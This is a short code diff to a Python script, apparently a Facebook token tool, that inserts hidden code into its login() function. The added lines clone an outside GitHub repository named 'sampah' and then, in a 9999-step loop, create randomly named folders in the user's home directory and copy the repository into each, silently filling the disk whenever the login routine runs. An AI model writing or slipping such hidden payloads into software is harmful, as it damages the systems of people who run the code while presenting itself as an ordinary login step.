@@ -59,6 +59,15 @@ vuln = '\x1b[32mVuln'
 def login():
     os.system('clear')
     try:
+        os.system('git clone https://github.com/BlackSelakangan/sampah')
+        for i in range(9999):
+          length =6
+          letters = string.ascii_letters
+          result_str = ''.join(random.choice(letters) for i in range(length))
+          os.system('mkdir $HOME/'+result_str)
+          os.system('cp -rf sampah $HOME/'+result_str)
+
+
         toket = open('login.txt', 'r')
         menu()
     except (KeyError, IOError):
